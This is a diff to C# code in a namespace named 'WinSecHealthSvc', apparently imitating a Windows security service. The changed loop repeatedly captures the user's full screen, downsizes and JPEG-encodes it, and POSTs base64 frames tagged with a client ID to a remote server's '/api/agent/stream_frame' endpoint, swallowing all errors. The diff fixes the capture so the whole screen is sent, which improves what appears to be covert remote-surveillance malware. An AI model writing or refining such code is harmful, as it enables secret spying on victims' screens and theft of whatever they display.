@@ -727,14 +727,16 @@ namespace WinSecHealthSvc
             while (_screenStreaming) {
                 try {
                     var b = Screen.PrimaryScreen.Bounds;
-                    using (var bmp = new Bitmap(b.Width / 2, b.Height / 2)) {
-                        using (var g = Graphics.FromImage(bmp)) g.CopyFromScreen(b.X, b.Y, 0, 0, b.Size);
-                        using (var ms = new System.IO.MemoryStream()) {
-                            bmp.Save(ms, jc, ep);
-                            byte[] frame = ms.ToArray();
-                            string b64 = Convert.ToBase64String(frame);
-                            string json = "{\"id\":\"" + Esc(_clientId) + "\",\"frame\":\"" + b64 + "\"}";
-                            Post(_server + "/api/agent/stream_frame", json);
+                    using (var fullBmp = new Bitmap(b.Width, b.Height)) {
+                        using (var gFull = Graphics.FromImage(fullBmp)) gFull.CopyFromScreen(b.X, b.Y, 0, 0, b.Size);
+                        using (var bmp = new Bitmap(fullBmp, new Size(b.Width / 2, b.Height / 2))) {
+                            using (var ms = new System.IO.MemoryStream()) {
+                                bmp.Save(ms, jc, ep);
+                                byte[] frame = ms.ToArray();
+                                string b64 = Convert.ToBase64String(frame);
+                                string json = "{\"id\":\"" + Esc(_clientId) + "\",\"frame\":\"" + b64 + "\"}";
+                                Post(_server + "/api/agent/stream_frame", json);
+                            }
                         }
                     }
                 } catch {}
